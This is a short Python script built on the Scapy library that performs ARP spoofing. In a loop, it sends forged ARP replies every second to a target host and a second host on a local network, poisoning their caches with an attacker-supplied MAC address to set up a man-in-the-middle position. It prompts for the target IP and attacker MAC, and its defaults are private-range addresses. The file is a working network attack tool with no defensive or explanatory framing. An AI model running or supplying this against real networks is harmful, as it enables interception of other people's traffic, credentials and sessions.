from scapy.all import *
import time

def arp_spoof(target_ip, broadcast_mac, second_target, attacker_mac):
    # Spoof target ARP entry
    target_arp = ARP(op=2, pdst=target_ip, hwdst=broadcast_mac, psrc=second_target, hwsrc=attacker_mac)
    
    # Spoof gateway ARP entry....the gateway should now be the target, and you pretend to be the target
    gateway_arp = ARP(op=2, pdst=second_target, hwdst=broadcast_mac, psrc=target_ip, hwsrc=attacker_mac)

    send(target_arp, verbose=0)
    send(gateway_arp, verbose=0)

if __name__ == "__main__":
    # Get target IP address from user input or use hardcoded value
    target_ip_input = input("Enter the target IP address (default is 192.168.0.100): ")
    target_ip = target_ip_input if target_ip_input else "192.168.0.100"

    # Get attacker MAC address from user input or use hardcoded value
    attacker_mac_input = input("Enter the attacker MAC address (default is 00:0c:29:ab:f3:d5): ")
    attacker_mac = attacker_mac_input if attacker_mac_input else "00:0c:29:ab:f3:d5"

    broadcast_mac = "FF:FF:FF:FF:FF:FF"  # Broadcast MAC address
    second_target = "192.168.0.110"
    #second_target = "192.168.0.1"
    #correct_mac = "ac:84:c6:b0:74:0c"  # Actual MAC address of router
    #00:0c:29:ab:3:d5
    try:
        # Perform ARP spoofing continuously until KeyboardInterrupt
        while True:
            arp_spoof(target_ip, broadcast_mac, second_target, attacker_mac)
            time.sleep(1)  
    except KeyboardInterrupt:
        print("\nARP spoofing stopped by user.")
